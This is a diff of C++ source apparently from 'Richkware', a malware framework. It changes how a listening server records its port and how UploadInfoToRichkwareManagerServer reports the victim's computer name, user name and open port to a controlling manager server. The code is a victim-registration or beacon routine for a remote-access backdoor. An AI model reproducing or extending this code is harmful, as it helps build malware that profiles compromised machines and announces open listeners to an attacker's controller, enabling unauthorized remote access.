@@ -6,12 +6,14 @@
 
 Server::Server(const char* encryptionKeyArg) {
 	encryptionKey = encryptionKeyArg;
+	port = "none";
 	hThread = NULL;
 	//condWhile = true;
 }
 
 Server& Server::operator=(const Server& server) {
 	encryptionKey = server.encryptionKey;
+    port = server.port;
 	hThread = server.hThread;
 	//condWhile = server.condWhile;
 	return *this;
@@ -98,7 +100,6 @@ const char* Network::RawRequest(const char* serverAddress, const char* port,	con
 		if (iResult > 0) {
 			// answer
 			response.append(recvbuf);
-
 		}
 		else if (iResult == 0) {
 			// connection closed
@@ -135,7 +136,9 @@ bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, con
 	if (!GetUserName(infoBuf, &bufCharCount))
 		userName = infoBuf;
 
-	Device device = Device(computerName + "/" + userName, "none");
+    const char* serverPort = server.getPort();
+
+	Device device = Device(computerName + "/" + userName, serverPort);
 
 	std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
 	//deviceStr = EncryptDecrypt(deviceStr,"5");
@@ -146,9 +149,11 @@ bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, con
 }
 
 
-void Server::Start(const char* port, bool encrypted) {
+void Server::Start(const char* portArg, bool encrypted) {
 	DWORD dwThreadId;
 	ServerThreadArgs sta;
+
+	port = portArg;
 	
 	if (encrypted)
 		sta.encryptionKey = encryptionKey;
@@ -176,7 +181,7 @@ void Server::Start(const char* port, bool encrypted) {
 	hints.ai_flags = AI_PASSIVE;
 
 	// Resolve the server address and port
-	iResult = getaddrinfo(NULL, port, &hints, &result);
+	iResult = getaddrinfo(NULL, portArg, &hints, &result);
 	if (iResult != 0) {
 		WSACleanup();
 		//throw 1;
@@ -218,11 +223,16 @@ void Server::Start(const char* port, bool encrypted) {
 
 void Server::Stop() {
 	//condWhile = false;
+    port = "none";
 	SuspendThread(hThread);
 }
 
 HANDLE Server::getHhread() {
 	return hThread;
+}
+
+const char* Server::getPort() {
+	return port;
 }
 
 DWORD WINAPI ServerThread(void* arg) {
